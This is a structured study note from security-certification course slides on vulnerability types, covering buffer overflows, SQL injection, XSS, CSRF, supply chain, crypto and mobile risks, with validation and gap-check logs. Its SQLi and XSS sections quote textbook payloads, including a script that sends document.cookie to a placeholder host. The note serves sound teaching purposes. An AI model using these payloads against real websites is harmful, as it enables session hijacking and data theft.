---
Unit: Types of Vulnerabilities
Domain: 2.0 Threats, Vulnerabilities, and Mitigations (sub-objective 2.3 — Explain various types of vulnerabilities)
Source: Pt2 p.51-79 (global 151-179; course slides 2-28 to 2-56). Boundaries: Pt2 p.51 = 2.3 roadmap (2-28, "Types of vulnerabilities" highlighted); Pt2 p.80 = 2.4 roadmap (2-57, "Indicators of malicious activity" highlighted), so 2.3 ends at Pt2 p.79
Extraction_Status: Fully Extracted (all 29 pages read via vision at 100 dpi)
Pages_Done: Pt2 p.51-79
Pages_Remaining: none
Validation_Status: Validated (2026-10-16) — all 29 pages re-opened at 130 dpi and compared with the note; see Validation log
---

## Roadmap and Section Topics (Source: Pt2 p.51-52)

- Pt2 p.51 (2-28) is the Domain 2 roadmap slide with "Types of vulnerabilities" highlighted. (Source: Pt2 p.51)
- Pt2 p.52 (2-29) is the 2.3 Section Topics slide, "2.3 Explain various types of vulnerabilities." (Source: Pt2 p.52)
  - **Application:** Memory injection; Buffer overflow; Race conditions (Time-of-check (TOC), Time-of-use (TOU)); Malicious update
  - **Operating system (OS)-based**
  - **Web-based:** Structured Query Language injection (SQLi); Cross-site scripting (XSS)
  - **Hardware:** Firmware; End-of-life; Legacy
  - **Virtualization:** Virtual machine (VM) escape; Resource reuse
  - **Cloud-specific**
  - **Supply chain:** Service provider; Hardware provider; Software provider
  - **Cryptographic**
  - **Misconfiguration**
  - **Mobile device:** Side loading; Jailbreaking
  - **Zero-day**

## Memory injection (Source: Pt2 p.53)

- **Memory injection vulnerabilities** — a type of security flaw where an attacker can introduce (inject) malicious code into a running application's process memory.
  - Designed to alter an application's behavior to provide unauthorized access or take control over the system.
  - Used to install malware, exfiltrate sensitive data, or create a backdoor for future access.
- **Common memory injection attacks:** buffer overflow attacks; format string vulnerabilities; code injection attacks.
- **Possible mitigations:** secure coding practices; input and output validation; encoding; type-casting; access controls; static and dynamic application testing.

(Source: Pt2 p.53)

## Buffer overflow (Source: Pt2 p.54-55)

- **Buffer** — an area of memory that an application reserves to store expected data. (Source: Pt2 p.54)
- **Buffer Overflow** — a memory corruption attack that takes advantage of vulnerabilities in program memory, allowing an attacker to crash or execute arbitrary code on a host. (Source: Pt2 p.54)
  - Inserting/injecting more information into an application than it is designed to handle; can provide an attacker with **system-level or root privileges**.
- **Object/Pointer Dereference** — once an attacker overflows the buffer and crashes the program, they can change the return address to an area where they have located their arbitrary code (shellcode) on the host. (Source: Pt2 p.54)
- **Memory Leak** (Source: Pt2 p.54)
  - An attacker inputs data that goes beyond the allocated boundary of the destination buffer and begins to corrupt adjacent memory.
  - A software vulnerability that can occur when software does not release allocated memory when it is done using it, potentially leading to system instability.
  - [CONFLICT] Under "Memory Leak" the first sub-bullet describes an overflow (data beyond the buffer boundary corrupting adjacent memory); only the second describes a leak. Kept as printed.
- **Diagram "Buffer Overflow – continued"** (graphic credited to an Education Ecosystem Instructor) (Source: Pt2 p.55):
  - Left: an empty memory block labelled "Unallocated Memory Space", above a stack of Saved Frame Pointer / Return Address / Parent Routine's Stack.
  - Upper right, labelled "Well Behaved": the grid holds H E L L O (stays inside the buffer); frame pointer, return address and parent stack unchanged.
  - Lower right, labelled "Malicious" (via a dashed arrow marked "AAA"): the grid is filled with \x90 \x90 \x90 \x90 / \xC0 A A M / A L I C / I O U S / C O D E — i.e. filler bytes followed by "MALICIOUS CODE" spilling past the buffer into the return-address area (shaded as the return-address rows).
  - Caption box: "Lack of Input/Output Validation".

## Pivoting / lateral movement (Source: Pt2 p.56)

- **Pivot/Lateral Movement** — using an exploited machine to attack and gain access to other systems and its data.
- Diagram: a mesh of workstations joined by blue lines, with five hosts boxed in red (leftmost; centre-left; top-centre; centre-right; and the host next to "SERVER 1"). Four boxes carry a "Pivot" label (centre-left, top-centre, centre-right, and the one beside SERVER 1); the leftmost box is unlabelled. A red line joins the leftmost boxed host to the centre-left boxed host. Credited "Images created by an Education Ecosystem Instructor".

(Source: Pt2 p.56)

## Race condition (Source: Pt2 p.57)

- **Race Condition** — occurs when the outcome from an execution process is directly dependent on the order and timing of certain events, and those events fail to execute in the order and timing intended by the developer.
  - **Time-of-Check/Time-of-Use (TOC/TOU)** — a *race condition* occurs when an app checks a resource and when an app uses the resource.
    - This change invalidates the check, and an attacker can identify a brief time window to manipulate data after it has been checked but before the application can use this data to perform some operation.

(Source: Pt2 p.57)

## Malicious update (Source: Pt2 p.58)

- **Malicious Update** — a vulnerability in a software repository or supply chain that a threat actor can exploit to add malicious code to a package.
  - An update that appears legitimate but contains harmful code, often used by cybercriminals to distribute malware or execute a cyberattack.
  - The update may claim to fix software bugs or offer new features but is instead designed to compromise a system.
    - 2017, the legitimate software CCleaner (Avast) was compromised when an unauthorized update containing a malicious payload (backdoor) was released into the supply chain of Piriform, which was acquired by Avast.
    - 2020 the SolarWinds attack, where an update to the SolarWinds Orion platform was used to distribute a malicious backdoor to numerous government and corporate networks, leading to significant data breaches.
- Picture: orange "DETOUR" sign; decorative.

(Source: Pt2 p.58)

## Operating system (OS)-based (Source: Pt2 p.59)

| OS | Items on the slide |
|---|---|
| Microsoft Windows | 2008 MS08-067 — vulnerability in Windows Server Service (Conficker worm). 2017 MS17-010 — vulnerability with Server Message Block (SMB) protocol; developed by the NSA and leaked by The Shadow Brokers; EternalBlue / EternalChampion / EternalRomance / EternalSynergy / **WannaCry** / WannaCrypt / Petya (EternalBlue and WannaCry in bold) |
| macOS | 2014 Shellshock — flaw in the Bash shell (all Unix-based systems, including macOS) |
| Android | 2015 Stagefright — vulnerability with MMS messages |
| iOS | 2019 watering hole attacks — vulnerabilities in the iOS; discovered by the Google's Project Zero team; gain full access to a device by having the victim visit a malicious website |
| Linux | 2014 The Heartbleed bug — vulnerability with OpenSSL |

(Source: Pt2 p.59)

## OWASP (Source: Pt2 p.60)

- **Open Web Application Security Project (OWASP)** — provides the standards, frameworks, and guidelines for the security of web applications.
  - The **OWASP Top 10 list** of security controls for web application developers. (Slide wording.)
- Table as printed (the slide does not state a year/edition): A1 Injection; A2 Broken Authentication; A3 Sensitive Data Exposure; A4 XML External Entities; A5 Broken Access Control; A6 Security Misconfiguration; A7 Cross-Site Scripting (XSS); A8 Insecure Deserialization; A9 Using Components with Known Vulnerabilities; A10 Insufficient Logging and Monitoring.

(Source: Pt2 p.60)

## SQL injection (SQLi) (Source: Pt2 p.61-63)

- **SQL Injection** — manipulates back-end databases used to serve many types of dynamic websites. (Source: Pt2 p.61)
  - Server-side attack.
  - A single quote (') — the one single character used to check for a SQL Injection.
- Example within a webpage (Source: Pt2 p.61):
  - Query template: `Select * from users where sessionID = '%URLvariable%'`
  - Legitimate request: `www.someSite.com/page.aspx?sessionID=xd4rgf6sd33gf4g` → `Select * from users where sessionID = 'xd4rgf6sd33gf4g'`
  - Not-so-legitimate request: `www.someSite.com/page.aspx?sessionID=1'%20or%201=1;--` → `Select * from users where sessionID= 1' or 1=1;--'`
- **Normal SQL Operation** (diagram) — a login form (Username bob1, Password 12345) sends `SELECT User from LOGON where ID=bob1 and PASS=12345` to the server; the SQL database table (User / ID / PASS: Bob bob1 12345; Susan susan St33ler$; Maurice maurice03 m@urice123) matches only Bob's row (highlighted green); the screen shows "Welcome back Bob!". (Source: Pt2 p.62)
- **SQL Injection** (diagram) — the entry `ID=admin and PASS=anything 'or'1'='1` produces `SELECT User from LOGON where ID=admin and PASS=anything 'or'1'='1`; the whole table is highlighted red and the screen shows "Welcome back Bob, Susan, and Maurice!". (Source: Pt2 p.63)

## Cross-site scripting (XSS) (Source: Pt2 p.64-69)

- **Cross-Site Scripting (XSS)** — injection of malicious code into a vulnerable web application or backend database that will execute scripts in a victim's browser. (Source: Pt2 p.64)
  - Can result in user session hijack, redirection to malware distribution site, or bypassing access controls.
  - Enables attackers to inject client-side script into web pages viewed by others.
  - Executed by the client (typically their browser).
  - Client-side attack.
  - Replace `<` with `&lt;` and `>` with `&gt;`.
- **Normal Web Operation** (diagram) — a user clicks a link to http://www.northropgrumman.com and the server responds normally. (Source: Pt2 p.65)
- **Persistent (Stored)** (Source: Pt2 p.66)
  - The web site does not properly sanitize input and code is added via user input (such as forum) by an attacker.
  - A user then views the webpage and the malicious script is executed.
  - This could allow the attacker to gain user info, such as a session cookie.
  - Example script on slide: `<script type="text/javascript"> var badURL= "www.badsite.com/" + document.cookie; document.write('<img src="' + badURL + '" />'); </script>`
  - Banner: "Use Filtered HTML; Replace < with &lt; and > with &gt;". Picture: cookie jar (decorative).
- **Persistent (Stored) – Example** (diagram) — an attacker adds a script on a forum or a comment section of the site; the legitimate user's request to http://www.northropgrumman.com returns the malicious content (skull-and-crossbones). (Source: Pt2 p.67)
- **Non-Persistent (Reflected)** (Source: Pt2 p.68)
  - Reflected XSS is a technique to get a victim to send a script to a server and the response back is malicious, thus "reflected" off the web server.
  - Uses reflected input to trick a user's browser into executing untrusted code from a trusted site.
  - The link below could be sent to you within an HTML spam email: `<img src="http://yourbank.com/nonExistantfile.jpg"onerror=alert(document.cookie);>`
- **Non-Persistent (Reflected) – Example** (diagram) — the attacker sends a malicious link; the user follows the link (http://www.northropgrumman.com/nonExistantfile.jpg), the server returns an ERROR, and the user "is infected from the error/return message from the site"; a Cookie/Session ID arrow runs between the user and the attacker. (Source: Pt2 p.69)

## Cross-site request forgery (CSRF/XSRF) (Source: Pt2 p.70-71)

- **Cross-Site Request Forgery (CSRF/XSRF)** — tricking a web browser into executing a malicious action on a **trusted** site for which the user is currently **authenticated**. (Source: Pt2 p.70)
  - Exploits the trust that a site has in a user's browser.
  - Takes advantage of an authenticated session.
  - Can result in data theft, unauthorized funds transfers, credential modifications, or stolen session cookies.
  - XSS (Cross-Site Scripting) does not need an authenticated session and can be exploited when the vulnerable website doesn't do the basics of validating or escaping input.
  - Often done without the user's knowledge.
  - Usually involves social engineering.
  - Banner: "Session Riding; One-Click Attack".
- **Continued** — four-screen example, banner "Trick a user's browser into doing an unwanted action" (screenshots credited to an Education Ecosystem Instructor) (Source: Pt2 p.71):
  (Screenshots show a Bank of America login page, a WhatsApp web chat, and a YouTube page.)
  1. Victim visits their banking website in one tab of their browser, but has other tabs open as well.
  2. One of those tabs is a chat program where they happen to receive a message with a link to a funny video.
  3. Victim clicks on the link which opens a webpage with the video, but included in the code of the page is a malicious script.
  4. The script runs quietly in the background where it opens a copy of the victim's banking website, screenshots it, and then closes it.

## Hardware vulnerabilities (Source: Pt2 p.72)

- End-of-life (EOL) hardware vulnerabilities arise when manufacturers cease providing product updates, parts, or patches to the firmware.
  - **End of Life (EOL)** — a manufacturer discontinues sales of a product, it enters an end-of-life phase and the support, availability and updates become more limited.
  - **End of Service Life (EOSL)** — a legacy system that is no longer supported by its developer or vendor and no longer receives security updates.
- **Lifecycle diagram** (credited to an Education Ecosystem Instructor): a downward arrow with milestones in order — General Availability (GA) Sale Date; End of Sale (EOS); End of Support (EOS) Development; End of Life (EOL); End of Extended Support; End of Service Life (EOSL). A bracket labelled "OEM Warranty Support" spans from GA to the EOL level; a bracket labelled "POST Warranty Support" spans from EOL down to EOSL.
- [CONFLICT] The diagram abbreviates both "End of Sale" and "End of Support" as "EOS". Kept as printed.
- The slide has no separate "Firmware" or "Legacy" heading; firmware appears in the EOL sentence and "legacy system" in the EOSL definition (here), and preinstalled-firmware vulnerabilities appear under hardware provider (Pt2 p.75).

(Source: Pt2 p.72)

## Risks associated with virtualization (Source: Pt2 p.73)

- **VM Escape** — refers to malware running on a guest OS jumping to another guest or to the host (an attack where malware running in a VM is able to interact directly with the hypervisor or host kernel).
  - **Sandboxing** — running apps in restricted memory areas to protect from VM escape should an application crash.
- **VM Sprawl** — the growth and expansion of virtual systems beyond what was initially intended (configuration vulnerability where provisioning and deprovisioning of virtual assets is not properly authorized and monitored).
- **Resource Reuse** — if the resources are not properly sanitized between each use, sensitive data could be leaked between virtual machines.
  - A new virtual machine may be allocated disk space that was previously used by another VM, and the new VM could recover sensitive data from the previous VM.
- **Intermingling Network Security Controls** — the tools used to administer the virtual machines may not have the same granularity as those needed to manage the network which could lead to privilege escalation and a compromise of security.

(Source: Pt2 p.73)

## Cloud vulnerabilities (Source: Pt2 p.74)

- Loss of physical control of data.
- **Cloud Bursting**
  - "Hybrid Clouds" allow vulnerabilities on a public cloud to affect private cloud systems.
  - When data migrates to and from private and public clouds, the risk of "spillage" increases.
- Diagram (credited to an Education Ecosystem Instructor): "Private Cloud (Internal Data Center)" and "Public Cloud (External Cloud)" joined by a two-way arrow, with "Hybrid Cloud" above them; storm clouds in the background.

(Source: Pt2 p.74)

## Supply chain vulnerabilities (Source: Pt2 p.75)

- **Service provider** — cloud services or third-party development agencies, offering development, testing, and deployment platforms or directly contributing to the software's codebase.
- **Hardware provider** — hardware suppliers; hardware components (preinstalled firmware contains a known vulnerability); physical tampering.
- **Software provider** — makers of libraries, frameworks, and other third-party components (vulnerabilities or outdated).
  - **Software Bill of Materials (SBOM)** — a comprehensive inventory of all components in a software product.
    - Inventory of third-party and open-source code used in an application or package.
    - Includes the primary application code and all dependencies: libraries, frameworks, and other third-party components; component names, versions, and information about the suppliers.

(Source: Pt2 p.75)

## Cryptographic vulnerabilities (Source: Pt2 p.76)

- **Social Engineering** — if the human can be persuaded to reveal the key, why try and guess?
- **Deprecated Algorithms** — use of a cryptographic algorithm that, although still available, should not be used because of known vulnerabilities. Users selecting weak algorithms like DES or SHA-1.
- **Improper Implementation (Misconfiguration)** — many breaches of cryptography are the result incorrect configurations or uses of the cryptography.
  - Users who choose SHA-224 when a much stronger SHA-512/256 exists.
  - Users who expose their private key can also seriously weaken cryptography.
  - MD5 and SHA-1 are now considered insecure due to collision attacks.
  - DES vulnerable to brute force attacks due to its 56-bit key size.
  - 3DES the "Sweet32" birthday attack (CVE-2016-2183); NIST officially deprecated 3DES in 2017 and recommended its discontinuation by 2023.
  - RSA can be vulnerable if small key sizes are used, if the random number generation for creating the keys is weak, or if the same key pair is used for an extended period.

(Source: Pt2 p.76)

## Misconfiguration examples (Source: Pt2 p.77)

- **Heartbleed** — a flaw contained in the OpenSSL that allowed an attacker to retrieve private memory of an application in chunks of 64k at a time; the impact was widespread affecting VPNs, webservers and mobile devices.
- **KRACK (Key Reinstallation Attacks)** — vulnerability in the WPA2 protocol that protects Wi-Fi traffic; allows an attacker within range of a victim to intercept and decrypt some types of sensitive network traffic.
- **The BEAST and POODLE** — attacks that target weaknesses in the cipher suites used by SSL and early versions of TLS.
  - POODLE (Padding Oracle On Downgraded Legacy Encryption)
  - BEAST (Browser Exploit Against SSL/TLS)
- Pictures: Heartbleed logo; poodle; decorative.

(Source: Pt2 p.77)

## Mobile system vulnerabilities (Source: Pt2 p.78)

- **Mobile device challenges include:** BYOD; lack of centralized control; malicious code; lost or stolen device.
- **Security risks to organizations include:** data confidentiality; data integrity; enforcement of security policies; remote or mobile devices connecting to corporate networks.
- **App sideloading/jailbreaking** — users can install apps packaged by the developers on to their devices without going through the store signing process.
  - Android — Rooting
  - Apple iOS — Jailbreaking

(Source: Pt2 p.78)

## Zero-day (Source: Pt2 p.79)

- **Zero-day** — a vulnerability in software that is unpatched by the developer or an attack that exploits such a vulnerability.
  - A vulnerability that is exploited before the developer knows about it or can release a patch.
  - An attack on a system exploiting a vulnerability that is unknown to others.
  - Usually applied to the vulnerability itself but can also refer to an attack or malware that exploits it.
  - *EternalBlue – WannaCry*
  - *Stuxnet worm*

(Source: Pt2 p.79)

## Boundary (Source: Pt2 p.80)
- Pt2 p.80 (2-57) is the Domain 2 roadmap slide with "Indicators of malicious activity" highlighted, so 2.3 ends at Pt2 p.79. Pt2 p.81 (2-58) is the 2.4 Section Topics slide. (Source: Pt2 p.80-81)

## Slide wording kept as printed (not corrected)
- "Side loading" (p.52) vs "sideloading" (p.78); "Time-of-check (TOC)" listed first on p.52; "Cross Site Request Forgery (XSRF)(CSRF)" title (p.70); "nonExistantfile.jpg" (p.68-69); "result incorrect configurations" (p.76); "the Google's Project Zero team" (p.59); "Object/Pointer Dereference" explained as a return-address overwrite (p.54).
- Slide content beyond the Section Topics list (kept): pivoting/lateral movement (p.56); OWASP Top 10 (p.60); CSRF (p.70-71); VM sprawl and intermingling network security controls (p.73); SBOM (p.75); misconfiguration examples Heartbleed/KRACK/BEAST/POODLE (p.77); mobile device challenges and risks (p.78).

## Validation log
- Extraction: 29 pages read at 100 dpi (Pt2 p.51-79) plus boundary pages p.80-81.
- Validation (separate pass, 2026-10-16): Pt2 p.52-79 all re-opened at 130 dpi and compared item by item (Section Topics list, every definition, the OS/year/CVE table, OWASP list, SQL strings and the three SQL diagrams, XSS script samples and examples, CSRF four-step example, EOL lifecycle diagram, virtualization/cloud/supply-chain/crypto/misconfiguration/mobile/zero-day bullets, page citations). Pt2 p.51 (2.3 roadmap) and p.80-81 (2.4 roadmap/Section Topics) are boundary slides seen at 100 dpi.
- Corrections made during validation: (1) the p.56 pivot diagram description was wrong about which boxes carry "Pivot" labels and where the red line runs — rewritten; (2) the p.71 screenshot content (Bank of America / WhatsApp / YouTube) was added. No other omissions, wrong values or wrong citations found. The two changed items were re-checked against the 130 dpi render.
- Slide wording kept as printed: see "Slide wording kept as printed" above; two [CONFLICT] flags remain (p.54 memory-leak bullet, p.72 "EOS" used twice).

## Official-objective gap check (2.3 bullets as listed on the slides' Section Topics slide, Pt2 p.52)
| Official bullet | Status | Where / note |
|---|---|---|
| Application: memory injection | Covered | Pt2 p.53 (definition, attack types, mitigations) |
| Application: buffer overflow | Covered | Pt2 p.54-55 (definition, pointer dereference, diagram); memory-leak bullet is internally muddled (p.54) |
| Application: race conditions (TOC/TOU) | Covered | Pt2 p.57 |
| Application: malicious update | Covered | Pt2 p.58 (CCleaner 2017, SolarWinds 2020) |
| Operating system (OS)-based | Covered (example-based) — dated incidents per OS; no general explanation of OS vulnerability classes | Pt2 p.59 |
| Web-based: SQLi | Covered | Pt2 p.61-63 |
| Web-based: XSS | Covered (stored and reflected; CSRF also covered) | Pt2 p.64-71 |
| Hardware: firmware | **Weak** — firmware appears only inside the EOL sentence and the hardware-provider sub-bullet; no firmware-vulnerability discussion | Pt2 p.72, p.75 |
| Hardware: end-of-life | Covered (EOL, EOSL, lifecycle diagram) | Pt2 p.72 |
| Hardware: legacy | **Weak** — only the phrase "a legacy system" inside the EOSL definition | Pt2 p.72 |
| Virtualization: VM escape | Covered (plus sandboxing, VM sprawl) | Pt2 p.73 |
| Virtualization: resource reuse | Covered | Pt2 p.73 |
| Cloud-specific | **Weak** — two bullets only (loss of physical control of data; cloud bursting with a hybrid-cloud diagram); no further cloud-specific vulnerability discussion | Pt2 p.74 |
| Supply chain: service provider | Covered | Pt2 p.75 |
| Supply chain: hardware provider | Covered | Pt2 p.75 |
| Supply chain: software provider | Covered (includes SBOM) | Pt2 p.75 |
| Cryptographic | Covered (social engineering, deprecated algorithms, improper implementation, named attacks) | Pt2 p.76 |
| Misconfiguration | Covered via examples — the slide titled "Misconfiguration Examples" lists protocol flaws (Heartbleed, KRACK, BEAST, POODLE); the general definition of misconfiguration and default-credential examples are in the 2.2 unit | Pt2 p.77; Pt2 p.39 |
| Mobile device: side loading | Covered (combined sideloading/jailbreaking definition) | Pt2 p.78 |
| Mobile device: jailbreaking | Covered (Android rooting; Apple iOS jailbreaking) | Pt2 p.78 |
| Zero-day | Covered | Pt2 p.79 |

**Gaps against the official objective:** firmware, legacy and cloud-specific vulnerabilities are thin (see the Weak rows). The OS-based and misconfiguration items are covered through examples rather than general explanations. The OWASP Top 10 table on p.60 does not state an edition; it is kept as printed. Under the strict status rule this objective is **Weakly Covered**. No [OUTSIDE-SLIDES] material has been added.
